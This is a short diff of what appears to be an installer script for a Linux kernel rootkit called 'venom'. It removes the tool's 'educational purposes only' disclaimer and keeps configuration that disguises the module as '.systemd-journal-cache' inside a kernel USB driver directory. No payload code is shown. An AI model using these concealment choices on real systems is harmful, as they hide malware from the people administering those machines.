@@ -20,11 +20,9 @@ ${PURPLE}
  ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
   ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
 ${NC}
-${CYAN}Advanced Persistent Rootkit Installation System${NC}
-${YELLOW}Educational purposes only - Use responsibly${NC}
+${CYAN} ──   trev • devil • obscurity  ── ${NC}
 "
 
-# Configuration
 MODULE_NAME="venom"
 STEALTH_NAME=".systemd-journal-cache" 
 INSTALL_DIR="/usr/lib/modules/$(uname -r)/kernel/drivers/usb/misc"
